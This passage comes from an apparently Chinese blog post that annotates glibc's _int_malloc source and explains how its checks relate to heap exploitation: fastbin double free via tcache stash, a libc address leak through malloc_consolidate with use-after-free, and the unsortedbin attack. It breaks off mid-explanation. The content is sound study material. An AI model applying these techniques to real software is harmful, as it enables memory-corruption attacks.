set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;  //将链表中的最后一个chunk拿去使用 随后恢复链表结构</span><br><span class="line">          bck-&gt;fd = bin; </span><br><span class="line"></span><br><span class="line">          if (av != &amp;main_arena) //如果分配区不是main_arena 设置chunk的arena为非main_arena</span><br><span class="line">        set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">    //和fastbin中一样 如果smallbin中链表还有其他free chunk 且符合tcachebin的范围 同时tcachebin中有空闲位置 就全部放到tcachebin中</span><br><span class="line">      /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">         stash them in the tcache.  */</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          if (tc_victim != 0)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;</span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If this is a large request, consolidate fastbins before continuing.</span><br><span class="line">     While it might look excessive to kill all fastbins before</span><br><span class="line">     even seeing if there is space available, this avoids</span><br><span class="line">     fragmentation problems normally associated with fastbins.</span><br><span class="line">     Also, in practice, programs tend to have runs of either small or</span><br><span class="line">     large requests, but less often mixtures, so consolidation is not</span><br><span class="line">     invoked all that often in most programs. And the programs that</span><br><span class="line">     it is called frequently in otherwise tend to fragment.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">    &#123;   //如果是从largebin中分配 就会触发malloc_consolidate来合并chunk 这个以前也有学过</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     Process recently freed or remaindered chunks, taking one only if</span><br><span class="line">     it is exact fit, or, if this a small request, the chunk is remainder from</span><br><span class="line">     the most recent non-exact fit.  Place other traversed chunks in</span><br><span class="line">     bins.  Note that this step is the only place in any routine where</span><br><span class="line">     chunks are placed in bins.</span><br><span class="line"></span><br><span class="line">     The outer loop here is needed because we might not realize until</span><br><span class="line">     near the end of malloc that we should have consolidated, so must</span><br><span class="line">     do so and retry. This happens at most once, and only when we would</span><br><span class="line">     otherwise need to expand memory to service a &quot;small&quot; request.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE </span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = 0;</span><br><span class="line">  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  //判断请求大小是否属于tcachebin的范围</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  int return_cached = 0;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = 0;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  for (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      int iters = 0;</span><br><span class="line">      //判断链表头的上一个chunk是否为链表头本身 如果是 那么链表中无空闲chunk 不进入while循环</span><br><span class="line">      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;  //获取链表中的最后一个chunk</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size); //获取victim下一个相邻chunk的地址</span><br><span class="line">          if (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)   //安全性检查</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)  //检查下一个chunk的size是否符合要求</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))  //检查next_chunk的prev_size是否正确</span><br><span class="line">            malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">          if (__glibc_unlikely (prev_inuse (next))) //检查next_chunk的prev_inuse位是否为0</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             If a small request, try to use last remainder if it is the</span><br><span class="line">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="line">             runs of consecutive small requests. This is the only</span><br><span class="line">             exception to best-fit, and applies only when there is</span><br><span class="line">             no exact fit for a small chunk.</span><br><span class="line">           */</span><br><span class="line"></span><br><span class="line">          if (in_smallbin_range (nb) &amp;&amp;   //如果请求大小属于small chunk 同时victim的size大于申请的size </span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;   //这一点要注意 check的是bck和main_arena中对应链表的指针 如果是通过填满tcache来把chunk释放进入unsortedbin的方式 还需要先随便申请一个小chunk才能触发这个if分支 具体原因就是第一次申请chunk的时候 unsorted_chunks(av)的值为0</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              /* split and reattach remainder */</span><br><span class="line">              remainder_size = size - nb;   //从剩余的空间中分割chunk</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              if (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                  remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* remove from unsorted list */</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim))  //安全性检查</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          /* Take now instead of binning if exact fit */</span><br><span class="line"></span><br><span class="line">          if (size == nb)  //如果申请的chunk大小和剩余的大小一致 就走这个分支</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena (victim);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">          /* Fill cache first, return to user only if cache fills.</span><br><span class="line">         We may return one of these chunks later.  */</span><br><span class="line">          if (tcache_nb            //如果有tcachebin 就先把这个chunk放到tcachebin中</span><br><span class="line">          &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">          tcache_put (victim, tc_idx);</span><br><span class="line">          return_cached = 1;</span><br><span class="line">          continue;</span><br><span class="line">        &#125;</span><br><span class="line">          else</span><br><span class="line">        &#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* place chunk in bin */</span><br><span class="line"></span><br><span class="line">          if (in_smallbin_range (size))   //这里根据chunk的大小来判断要放入smallbin还是largebin</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              /* maintain large bins in sorted order */  //这一段是largebin按照大小排序的部分</span><br><span class="line">              if (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  /* Or with inuse bit to speed comparisons */</span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  /* if smaller than smallest, bypass loop below */</span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  if ((unsigned long) (size)</span><br><span class="line">              &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      while ((unsigned long) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      if ((unsigned long) size</span><br><span class="line">              == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                        /* Always insert in the second position.  */</span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      else</span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      if (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              else</span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="line">     filling the cache, return one of the cached ones.  */ </span><br><span class="line">      ++tcache_unsorted_count;   //检查tcachebin链表中的chunk是否超过范围</span><br><span class="line">      if (return_cached</span><br><span class="line">      &amp;&amp; mp_.tcache_unsorted_limit &gt; 0</span><br><span class="line">      &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#define MAX_ITERS       10000</span><br><span class="line">          if (++iters &gt;= MAX_ITERS)</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If all the small chunks we found ended up cached, return one now.  */</span><br><span class="line">      if (return_cached)  //如果之前把chunk放到tcachebin里面 这里取出来就可以了</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         If a large request, scan through the chunks of current bin in</span><br><span class="line">         sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="line">       */</span><br><span class="line">      //如果申请的chunk大小在largebin的范围里 就扫描largebinchunk来查找最合适的chunk</span><br><span class="line">      if (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          /* skip scan if empty or largest chunk is too small */</span><br><span class="line">          if ((victim = first (bin)) != bin</span><br><span class="line">          &amp;&amp; (unsigned long) chunksize_nomask (victim)</span><br><span class="line">            &gt;= (unsigned long) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              while (((unsigned long) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (unsigned long) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              /* Avoid removing the first entry for a size so that the skip</span><br><span class="line">                 list does not have to be rerouted.  */</span><br><span class="line">              if (victim != last (bin)</span><br><span class="line">          &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">            == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              /* Exhaust */</span><br><span class="line">              if (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              /* Split */</span><br><span class="line">              else</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">                     have to perform a complete insert here.  */</span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">          if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks&quot;);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  if (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                      remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         Search for a chunk by scanning bins, starting with next largest</span><br><span class="line">         bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="line">         (with ties going to approximately the least recently used) chunk</span><br><span class="line">         that fits is selected.</span><br><span class="line"></span><br><span class="line">         The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="line">         The particular case of skipping all bins during warm-up phases</span><br><span class="line">         when no chunks have been returned yet is faster than it might look.</span><br><span class="line">       */</span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);   //后面这一部分关于内存桶的 暂时没看懂</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      map = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      for (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          /* Skip rest of block if there are no more set bits in this block.  */</span><br><span class="line">          if (bit &gt; map || bit == 0)</span><br><span class="line">            &#123;</span><br><span class="line">              do</span><br><span class="line">                &#123;</span><br><span class="line">                  if (++block &gt;= BINMAPSIZE) /* out of bins */</span><br><span class="line">                    goto use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              while ((map = av-&gt;binmap[block]) == 0);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* Advance to bin with set bit. There must be one. */</span><br><span class="line">          while ((bit &amp; map) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= 1;</span><br><span class="line">              assert (bit != 0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* Inspect the bin. It is likely to be non-empty */</span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          /*  If a false alarm (empty bin), clear the bit. */</span><br><span class="line">          if (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              /*  We know the first chunk in this bin is big enough to use. */</span><br><span class="line">              assert ((unsigned long) (size) &gt;= (unsigned long) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              /* unlink */</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              /* Exhaust */</span><br><span class="line">              if (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              /* Split */</span><br><span class="line">              else</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">                     have to perform a complete insert here.  */</span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">          if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 2&quot;);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  /* advertise as last remainder */</span><br><span class="line">                  if (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  if (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                      remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      /*</span><br><span class="line">         If large enough, split off the chunk bordering the end of memory</span><br><span class="line">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="line">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="line">         less well fitting) than any other available chunk since it can</span><br><span class="line">         be extended to be as large as necessary (up to system</span><br><span class="line">         limitations).</span><br><span class="line"></span><br><span class="line">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="line">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="line">         exhausted by current request, it is replenished. (The main</span><br><span class="line">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="line">         to put in fenceposts in sysmalloc.)</span><br><span class="line">       */</span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      if (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (&quot;malloc(): corrupted top size&quot;);</span><br><span class="line"></span><br><span class="line">      if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* When we are using atomic ops to free fast chunks we can get</span><br><span class="line">         here for all block sizes.  */</span><br><span class="line">      else if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          /* restore original bin index */</span><br><span class="line">          if (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          else</span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         Otherwise, relay to handle system-dependent cases</span><br><span class="line">       */</span><br><span class="line">      else</span><br><span class="line">        &#123;</span><br><span class="line">          void *p = sysmalloc (nb, av);</span><br><span class="line">          if (p != NULL)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几百行代码读下来 感觉还是有点蒙蔽的  总结一下<br>首先判断nb是否属于fastbin的范围 如果属于则获取fastbin对应链表的链表头 当链表中存在空闲chunk的时候 将chunk从fastbin链表中取出(遵从先进先出原则) 同时 如果开启了tcachebin机制 当tcachebin对应链表尚有空闲(一条链表默认最大存储7个chunk) 并且fastbin该链表中取出一个chunk后 仍有剩余 就会触发tcache stash机制 会将fastbin链表中的chunk转移到tcachebin中<br>这一机制存在漏洞利用的可能 在glibc2.29以后 tcachebin针对double free进行了安全防护 当chunk被释放进入链表后 chunk的bk域就会被写入key key的值为堆地址去除后三位 攻击者需要更改key 才能实现double free 而fastbin对于double free的检查 只会比较上一次和这次释放的指针是否一致 所以就可以通过在fastbin中实现double free 然后触发tcache stash来将链表放到tcachebin中<br>接着如果nb大小在smallbin的范围内 就遍历smallbin 因为smallbin的链表和fastbin tcachebin一样 每一个范围内的大小都有一个链表 查询起来更加快速 这一段代码同样引入了tcache stash机制 来确保内存申请的效率<br>如果nb的大小在largebin的范围内 就会调用malloc_consolidata函数 这个函数会合并物理相邻的fastbin chunk 很多时候 这一个函数也会导致许多漏洞 比如此时两个物理相邻的fastbin chunkA和B 如果用户手里有UAF的权限 在触发malloc_consolidata之前 控制的只是一个fastbin chunk 触发只会 就会合并成smallbin chunk 此时chunk的fd和bk域就填充了libc真实地址 如果用户利用UAF漏洞 就可以泄露libc基址<br>接下来的代码负责处理从unsortedbin中申请chunk 最为关键的就是如下这些check 这些check保证了攻击者不会构造unsortedbin chunk的fd域和bk域 从而实现任意地址申请chunk以及任意地址写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;  //获取链表中的倒数第二个chunk</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size); //获取victim下一个相邻chunk的地址</span><br><span class="line">          if (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)   //安全性检查</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)  //检查下一个chunk的size是否符合要求</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))  //检查next_chunk的prev_size是否正确</span><br><span class="line">            malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">          if (__glibc_unlikely (prev_inuse (next))) //检查next_chunk的prev_inuse位是否为0</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br></pre></td></tr></table></figure><p>unsorted_chunks(av)可以获取unsortedbin链表的链表头指针 当链表头的bk域指向自己 也就是链表中 链表头和链表尾都为同一个chunk的时候 说明这个链表中已经没有其他的chunk了 那么就不会进入while循环 这一个check看似简单 但是实际上起到了非常大的防御功能 我在伪造chunk时 就是无法绕过这一个check来跳过while循环<br>第一个check 检查victim的size是否符合要求<br>第二个和第三个check 检查victim物理相邻的chunk的size和prev_size是否符合要求<br>第四个check 检查victim上一个chunk(bck)的fd域是否指向victim 确保链表的完整性<br>第五个check 检查next_chunk的prev_size的inuse位 因为处于unsortedbin链表中的chunk肯定都是处于free状态的 如果inuse不为0 就触发报错<br>同时 在从unsortedbin中申请chunk后 还会有两句负责完善chunk的fd域和bk域 从而确保链表连通性</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim))  //安全性检查</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>这两句即是2.31版本以前的unsortedbin attack攻击手法所利用到的 通过覆盖unsortedbin chunk的bk域 将其修改为ptr_addr - 0x10 在执行到 bck-&gt;fd &#x3D; unsorted_chunks(av)时 